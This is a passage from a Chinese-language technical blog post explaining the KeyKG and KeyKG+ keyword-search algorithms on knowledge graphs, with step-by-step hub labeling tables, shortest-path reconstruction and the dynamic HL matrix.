inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;"><strong>0.6</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>则有属于 <span class="math inline">\(L_1(B)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.6, \textrm{pred}= A)\)</span> ，同时 B 插入到 PQ 中。</p><p>类似的，有</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;"><strong>0.4</strong></td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;"><strong>0.3</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>属于 <span class="math inline">\(L_1(C)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></p><p>属于 <span class="math inline">\(L_1(D)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></p><p>属于 <span class="math inline">\(L_1(E)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></p><p>在所有 A 的邻居访问完后，PQ 变为</p><table><thead><tr class="header"><th style="text-align: center;">E</th><th style="text-align: center;">C</th><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><p>然后，回到 <code>while</code> 循环。</p><hr /><p>PQ 弹出 E，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[E] = 0.3 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,E) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 31%" /><col style="width: 8%" /><col style="width: 8%" /><col style="width: 8%" /><col style="width: 33%" /><col style="width: 8%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>E 未访问的邻居为 B，但由于 <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[E] + \text{wt}((E,B)) = 0.3 + 0.8 = 1.1 &gt; d[B] = 0.6\)</span>，所以不更新；又由于 B 在 PQ 中，所以不加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">C</th><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;"></td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 C，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[C] = 0.4 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,C) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 25%" /><col style="width: 7%" /><col style="width: 26%" /><col style="width: 7%" /><col style="width: 26%" /><col style="width: 7%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>C 未访问的邻居为 F，但由于 <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[C] + \text{wt}((C,F)) = 0.4 + 2 = 2.4 &lt; d[F] = \infty\)</span>，所以，更新 <span class="math inline">\(d[F]\)</span> ：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;">0.4</td><td style="text-align: center;">1</td><td style="text-align: center;">0.3</td><td style="text-align: center;"><strong>2.4</strong></td></tr></tbody></table><p>此时，属于 <span class="math inline">\(L_1(F)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 2.4, \textrm{pred}= C)\)</span></p><p>又由于 F 不在 PQ 中，所以加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;"></td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 B，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[B] = 0.6 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,B) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table style="width:100%;"><colgroup><col style="width: 21%" /><col style="width: 23%" /><col style="width: 22%" /><col style="width: 5%" /><col style="width: 22%" /><col style="width: 5%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>B 未访问的邻居为 F，但由于 <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[B] + \text{wt}((B,F)) = 0.6 + 0.1 = 0.7 &lt; d[F] = 2.4\)</span>，所以，更新 <span class="math inline">\(d[F]\)</span> ：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;">0.4</td><td style="text-align: center;">1</td><td style="text-align: center;">0.3</td><td style="text-align: center;"><strong>0.7</strong></td></tr></tbody></table><p>此时，属于 <span class="math inline">\(L_1(F)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></p><p>又由于 F 在 PQ 中，所以不加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">D</th><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 D，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[D] = 1 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,D) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 18%" /><col style="width: 20%" /><col style="width: 19%" /><col style="width: 18%" /><col style="width: 19%" /><col style="width: 5%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>D 没有未访问的邻居，故不更新 <span class="math inline">\(d[F]\)</span> ，也就没有顶点加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头（队尾）</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 F，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[F] = 0.7 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,F) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 16%" /><col style="width: 17%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></td></tr></tbody></table><p>F 没有未访问的邻居，故不更新 <span class="math inline">\(d[F]\)</span> ，也就没有顶点加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"></td></tr></tbody></table><hr /><p>至此，第一次 for 迭代结束，索引结果为</p><table style="width:100%;"><colgroup><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.6, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></td></tr></tbody></table><p>类似的处理，可得下图右下角的索引。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><h4 id="extension-of-index-structure">Extension of Index Structure</h4><p>为了支持计算 <code>getSP</code> ，我们需要扩展 <code>L</code> 的索引结构。在<strong>算法 2</strong> 中，对于每一个 hub <span class="math inline">\(v_i\in L(w)\)</span> ，我们不仅仅存储了 <span class="math inline">\(\textrm{dist}(w,v_i)\)</span> ，还存储了以 <span class="math inline">\(v_i\)</span> 为根节点搜索树中 <span class="math inline">\(w\)</span> 的前驱顶点，并将其记作 <span class="math inline">\(\textrm{pred}(w,v_i)\)</span> （Line 16）。</p><p>有了扩展后的索引结构，<code>getSP</code> 就可以通过<strong>算法 3</strong> 计算得到。为了得到顶点 <span class="math inline">\(u,\;v\)</span> 之间的一条最短路径 <span class="math inline">\(p\)</span> ，我们首先在 <span class="math inline">\(p\)</span> 上找到它们所共有的 hub <span class="math inline">\(h_{\textrm{min}}\)</span> （Line 1），然后重复地跟随前驱顶点，构造路径 <span class="math inline">\(p\)</span> 的从 <span class="math inline">\(u\)</span> 到 <span class="math inline">\(h_{\textrm{min}}\)</span> 的一段（Line 2-8），以及 <span class="math inline">\(v\)</span> 到 <span class="math inline">\(h_{\textrm{min}}\)</span> 的一段（Line 9-14）。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo3.PNG" alt="Algorithm 3" /><figcaption>Algorithm 3</figcaption></figure><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>举个例子，比如计算 <code>getSP(D, F)</code> 。</p><p>首先，<code>L(D)</code> 和 <code>L(F)</code> 的公共 hub 只有一个，就是 <span class="math inline">\(A\)</span>，则 <span class="math inline">\(h_{\textrm{min}} = A\)</span> 。</p><p>然后，通过 <code>pred</code> 信息找到 D-A 的路径，为 D-A ，因为 <code>L(D)</code> 中 <span class="math inline">\(A\)</span> 的 <code>pred</code> 为 <span class="math inline">\(A\)</span>。</p><p>接着，同样的，找到 F-A 的路径，为 F-B-A，因为 <code>L(F)</code> 中的 A 的 <code>pred</code> 为 <span class="math inline">\(B\)</span>，L(B) 中的 <span class="math inline">\(A\)</span> 的 <code>pred</code> 为 <span class="math inline">\(A\)</span>。</p><p>最后，将上面两个子路径连起来，我们就找到了路径 <span class="math inline">\(p\)</span>，为 D-A-B-F。</p><h2 id="keykg-with-dynamic-hl">KeyKG+ With Dynamic HL</h2><h3 id="dynamic-hl">Dynamic HL</h3><h4 id="features">Features</h4><ul><li><strong>查询相关的</strong>（<em>query-relevant</em>）</li><li><strong>在线构造的</strong>（<em>online constructed</em>）</li></ul><h4 id="definition-and-structure">Definition and structure</h4><p>一个动态 HL 是一个 <span class="math inline">\((g-1)\times n\)</span> 的矩阵，记作 <span class="math inline">\(M\)</span> 。行对应于关键词顶点集 <span class="math inline">\(K_2,K_3,\dots,K_g\)</span> ，列对应于 hub 顶点。<span class="math inline">\(M\)</span> 的第 <span class="math inline">\((i-1)\)</span> 行（记作 <span class="math inline">\(M_{i-1}\)</span>）倒排并且聚集了 <span class="math inline">\(K_i\)</span> 中顶点的静态索引标签。<span class="math inline">\(M_{i-1}\)</span> 的第 j 个元素（记作 <span class="math inline">\(M_{i-1,j}\)</span>）是非空的，如果 <span class="math inline">\(h_j\in V\)</span> 是一个 hub，并且它在 <span class="math inline">\(K_i\)</span> 的至少一个顶点的静态索引标签中。在 <span class="math inline">\(K_i\)</span> 中的这些顶点中（这些顶点的静态索引标签包括 <span class="math inline">\(h_j\)</span>），<span class="math inline">\(M_{i-1, j}\)</span> 代表了最小化到达 <span class="math inline">\(h_j\)</span> 的距离的顶点。如果， <span class="math inline">\(h_j\)</span> 不是一个在 <span class="math inline">\(K_i\)</span> 中任意一个顶点的索引标签中的 hub，那么我们令 <span class="math inline">\(M_{i-1, j}\)</span> 为 null： <span class="math display">\[M_{i-1,j}=\begin{cases}&amp;\underset{u\in K_i\; s.t.\; h_j\in L(u)}{\textrm{argmin}}\textrm{dist}(u, h_j)&amp;h_j\in \bigcup_{u\in K_i}L(u),\\&amp;null&amp;h_j\not\in \bigcup_{u\in K_i}L(u),\end{cases}\]</span> 具体的，论文中使用<strong>二维数组</strong>存储矩阵 <span class="math inline">\(M\)</span> ，因此可以支持常数时间的随机访问。对于每一个不为 null 的 <span class="math inline">\(M_{i-1, j}\)</span> ，与 <span class="math inline">\(h_j\)</span> 的距离也是先计算出来，并保存到 <span class="math inline">\(M\)</span> 中。</p><h4 id="example">Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><ul><li><span class="math inline">\(i = 2\)</span> 时，<span class="math inline">\(K_2=\{E\}\)</span> ，<span class="math inline">\(L(E) = \{A,B,E\}\)</span> ，因此矩阵 <span class="math inline">\(M\)</span> <span class="math inline">\(K_2\)</span> 行只有 <span class="math inline">\(A,B,E\)</span> 不为 null，其他都为 null；由于 <span class="math inline">\(K_2\)</span> 中只有一个元素 <span class="math inline">\(E\)</span> ，故 <span class="math inline">\(K_2\)</span> 行 <span class="math inline">\(A,B,E\)</span> 列中的元素都为 <span class="math inline">\(E\)</span> 和到它的距离（从 <span class="math inline">\(L(E)\)</span> 中直接取得）。</li><li><span class="math inline">\(i = 3\)</span> 时，<span class="math inline">\(K_3=\{C,D\}\)</span> ，<span class="math inline">\(L(C)\cup L(D) = \{A,C,D\}\)</span> ，因此矩阵 <span class="math inline">\(M\)</span> <span class="math inline">\(K_3\)</span> 行只有 <span class="math inline">\(A,C,D\)</span> 不为 null，其他都为 null；由于 <span class="math inline">\(K_3\)</span> 中有两个元素，故 <span class="math inline">\(K_3\)</span> 行 <span class="math inline">\(A,C,D\)</span> 列中的元素需要对比一下分别到 <span class="math inline">\(C\)</span> 和 <span class="math inline">\(D\)</span> 的距离，选择较小的存入矩阵 <span class="math inline">\(M\)</span> （比如 <span class="math inline">\(M_{K_3, A}\)</span> ，由于 <span class="math inline">\(\textrm{dist}(C,A) &lt; \textrm{dist}(D,A)\)</span>，所以将 <span class="math inline">\(C\)</span> 存入矩阵）。</li></ul><p>综上所示，矩阵 <span class="math inline">\(M\)</span> 如下图所示：</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/11/matrix-M.PNG" alt="Dynamic HL Example" /><figcaption>Dynamic HL Example</figcaption></figure><h3 id="algorithm-keykg-1">Algorithm KeyKG+</h3><h4 id="algorithm-explained-1">Algorithm Explained</h4><p>KeyKG+ 如<strong>算法 4</strong> 所示。这个算法主要构造了动态 HL，并将其使用在两个方面，提高执行的总体性能，并且对最终结果没有任何影响。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/11/Algo4.PNG" alt="Algorithm 4" /><figcaption>Algorithm 4</figcaption></figure><p>在第一部分，首先，为 <span class="math inline">\(K_2,\dots,K_g\)</span> 构造矩阵 <span class="math inline">\(M\)</span> （Line 1-3）。然后，按照如下流程利用 <span class="math inline">\(M_{i-1}\)</span> 找到 <span class="math inline">\(v_i\)</span> （Line 6）。对于每一个 hub <span class="math inline">\(h_j\in L(v_1)\)</span> ，我们从 <span class="math inline">\(L(v_1)\)</span> 中取得 <span class="math inline">\(\textrm{dist}(v_1,h_j)\)</span> ，并且从 <span class="math inline">\(M_{i-1}\)</span> 中取 <span class="math inline">\(M_{i-1, j}\)</span> 元素的 <span class="math inline">\(\textrm{dist}(M_{i-1,j},h_j)\)</span> 。如果 <span class="math inline">\(M_{i-1,j}\)</span> 非空，那么我们计算： <span class="math display">\[\textrm{dist}(v_1,h_j)+\textrm{dist}(M_{i-1,j},h_j)\]</span> 这个结果表示了 <span class="math inline">\(v_1\)</span> 到在 <span class="math inline">\(K_i\)</span> 中经过一个特定的 <span class="math inline">\(h_j\)</span> 所能到达的顶点之间的最短距离。最后， 通过如下方式，找到 <span class="math inline">\(v_i\)</span> ： <span class="math display">\[v_i=\underset{M_{i-1, j}\; s.t.\; h_j\in L(v_1)\; \textrm{and}\; M_{i-1, j}\ne \textrm{null}}{\textrm{argmin}} \textrm{dist}(v_1,h_j)+\textrm{dist}(M_{i-1,j},h_j)\]</span> KeyKG+ Line 6 计算得到的 <span class="math inline">\(v_i\)</span> 和 KeyKG Line 3 得到的 <span class="math inline">\(v_i\)</span> 等价，但是 KeyKG+ 的效率更高。</p><p>第二部分，我们像为 <span class="math inline">\(K_i\)</span> 创建 <span class="math inline">\(M_{i-1}\)</span> 一样，为 <span class="math inline">\(V_{T_u}\)</span> （Line 14）创建 <span class="math inline">\(M&#39;_{u}\)</span> 。随着 <span class="math inline">\(T_u\)</span> 在每次迭代中逐渐扩展（Line 21），<span class="math inline">\(M&#39;_{u}\)</span> 通过加入到 <span class="math inline">\(T_u\)</span> 的顶点的静态索引标签得到更新（Line 22）。对于每一个 <span class="math inline">\(t_i\in(U_x\backslash V_{T_u})\)</span> ，<span class="math inline">\(M&#39;_u\)</span> 被用来找到与 <span class="math inline">\(t_i\)</span> 距离最短的顶点 <span class="math inline">\(s_i\in V_{T_u}\)</span> （Line 16-18）。我们在所有的这样的 <span class="math inline">\(&lt;s_i,t_i&gt;\)</span> 中找到最小的 <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> （Line 19）</p><p>KeyKG+ Line 16-19 计算得到的 <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> 和 KeyKG Line 12 得到的 <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> 等价，但是 KeyKG+ 的效率更高。</p><h4 id="running-example-1">Running Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>如上图，</p><ul><li>令 <span class="math inline">\(B\in K_1\)</span> 为 <span class="math inline">\(v_1\)</span> ，查询其 Static HL，得到 <span class="math inline">\(L(B) = \{A,B\}\)</span> ；<ul><li>因为 <span class="math inline">\(M_{1,A} = M_{1,B} = E\)</span> ，所以令 <span class="math inline">\(E\in K_2\)</span> 为 <span class="math inline">\(v_2\)</span> ；</li><li>因为 <span class="math inline">\(M_{2,A} = C, M_{2,B} = \textrm{null}\)</span> ，所以令 <span class="math inline">\(C\in K_3\)</span> 为 <span class="math inline">\(v_3\)</span> ；</li><li>这样就形成了 